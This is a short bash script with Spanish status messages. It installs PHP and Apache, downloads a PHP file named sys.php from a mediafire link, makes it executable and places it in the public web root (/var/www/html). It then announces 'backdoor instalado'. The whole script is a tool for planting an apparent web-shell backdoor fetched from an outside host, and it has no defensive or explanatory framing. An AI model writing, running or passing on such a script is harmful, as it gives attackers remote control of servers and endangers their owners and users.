#!/bin/bash
clear
printf "\e[1;32mBienvenido\n"
apt-get install python -y
apt-get install wget -y
apt-get install php -y
apt-get install apache2 -y
wget https://download848.mediafire.com/u78yfqqof15g/9n2lrd7fg51gn5s/sys.php
chmod +x  sys.php
clear
mv sys.php /var/www/html
clear
printf "\e[1;32mbackdoor instalado\n"
